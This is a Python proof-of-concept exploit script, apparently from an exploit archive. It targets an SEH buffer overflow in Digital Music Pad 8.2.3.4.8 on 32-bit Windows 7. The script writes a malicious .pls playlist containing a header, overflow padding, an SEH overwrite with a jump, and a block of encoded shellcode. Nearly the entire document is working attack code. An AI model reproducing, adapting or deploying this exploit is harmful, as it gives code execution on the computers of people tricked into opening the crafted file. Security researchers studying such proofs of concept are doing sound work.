#Digital Music Pad 8.2.3.4.8 - (.pls) SEH Overflow
#Win7 SP1 32bit
#Original here for Win XP SP2: https://www.exploit-db.com/exploits/15855/

import struct, binascii, sys

filename = "POC.pls"

head = "\x5B\x70\x6C\x61\x79\x6C\x69\x73\x74\x5D\x0D\x0A\x46\x69\x6C\x65\x31\x3D"

junk="\x41" * 260

buf =  ""
buf += "\xda\xcb\xd9\x74\x24\xf4\xba\xc3\x66\x70\x52\x58\x29"
buf += "\xc9\xb1\x48\x31\x50\x18\x03\x50\x18\x83\xc0\xc7\x84"
buf += "\x85\xae\x2f\xca\x66\x4f\xaf\xab\xef\xaa\x9e\xeb\x94"
buf += "\xbf\xb0\xdb\xdf\x92\x3c\x97\xb2\x06\xb7\xd5\x1a\x28"
buf += "\x70\x53\x7d\x07\x81\xc8\xbd\x06\x01\x13\x92\xe8\x38"
buf += "\xdc\xe7\xe9\x7d\x01\x05\xbb\xd6\x4d\xb8\x2c\x53\x1b"
buf += "\x01\xc6\x2f\x8d\x01\x3b\xe7\xac\x20\xea\x7c\xf7\xe2"
buf += "\x0c\x51\x83\xaa\x16\xb6\xae\x65\xac\x0c\x44\x74\x64"
buf += "\x5d\xa5\xdb\x49\x52\x54\x25\x8d\x54\x87\x50\xe7\xa7"
buf += "\x3a\x63\x3c\xda\xe0\xe6\xa7\x7c\x62\x50\x0c\x7d\xa7"
buf += "\x07\xc7\x71\x0c\x43\x8f\x95\x93\x80\xbb\xa1\x18\x27"
buf += "\x6c\x20\x5a\x0c\xa8\x69\x38\x2d\xe9\xd7\xef\x52\xe9"
buf += "\xb8\x50\xf7\x61\x54\x84\x8a\x2b\x30\x69\xa7\xd3\xc0"
buf += "\xe5\xb0\xa0\xf2\xaa\x6a\x2f\xbe\x23\xb5\xa8\xc1\x19"
buf += "\x01\x26\x3c\xa2\x72\x6e\xfa\xf6\x22\x18\x2b\x77\xa9"
buf += "\xd8\xd4\xa2\x44\xd1\x73\x1d\x7b\x1c\xc3\xcd\x3b\x8f"
buf += "\xab\x07\xb4\xf0\xcb\x27\x1e\x99\x63\xda\xa1\xa7\xc8"
buf += "\x53\x47\xcd\x3e\x32\xdf\x7a\xfc\x61\xe8\x1d\xff\x43"
buf += "\x40\x8a\x48\x82\x57\xb5\x49\x80\xff\x21\xc1\xc7\x3b"
buf += "\x53\xd6\xcd\x6b\x04\x40\x9b\xfd\x67\xf1\x9c\xd7\x12"
buf += "\xf1\x08\xdc\xb4\xa6\xa4\xde\xe1\x80\x6a\x20\xc4\x9b"
buf += "\xa3\xb4\xa7\xf3\xcb\x58\x28\x03\x9a\x32\x28\x6b\x7a"
buf += "\x67\x7b\x8e\x85\xb2\xef\x03\x10\x3d\x46\xf0\xb3\x55"
buf += "\x64\x2f\xf3\xf9\x97\x1a\x05\xc5\x41\x62\x73\x27\x52"

nseh="\x90\x90\xeb\x16"

seh=struct.pack("<I",0x7294575a)

nop="\x41"*24

textfile = open(filename , 'w')
textfile.write(head+junk+nseh+seh+nop+buf+nop)
textfile.close()
